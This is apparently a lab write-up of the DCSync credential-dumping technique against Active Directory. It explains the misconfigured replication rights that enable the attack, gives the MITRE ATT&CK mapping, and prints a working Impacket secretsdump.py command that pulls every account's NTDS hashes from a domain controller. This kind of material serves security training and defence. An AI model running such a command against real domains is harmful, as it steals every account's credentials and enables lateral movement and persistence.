# DCSync Attack in Active Directory

## Technique Overview

DCSync allows an attacker to simulate the behavior of a Domain Controller and request account credential material (NTDS hashes) from a real DC over LDAP. This doesn’t require code execution on the DC itself but **does** require high‑privilege rights.

- **MITRE ATT&CK ID:** [T1003.003 – OS Credential Dumping: DCSync](https://attack.mitre.org/techniques/T1003/003/)  
- **Tools Used:**  Impacket ('secretsdump.py')

---

## Lab Misconfiguration

The  user 'emmet' was granted the following rights via ACL on the Domain:

- 'Replicating Directory Changes
- 'Replicating Directory Changes All'

> In real environments, overly permissive ACLs on the domain or on the 'krbtgt' account can allow DCSync.

---

## Exploitation Steps

1. **Run Impacket secretsdump.py**  
   On your attacker box, execute: 
  ```bash
    secretsdump.py mydomain.com/emmet:'<PASS>'@10.10.1.200
  ```
Extracted hashes will appear in your console.

## Impact
Full NTDS.dit credentials for every domain account, including highly privileged ones.

Enables offline cracking, lateral movement, and Golden Ticket creation.

Considered one of the most powerful post‑exploitation techniques in AD.
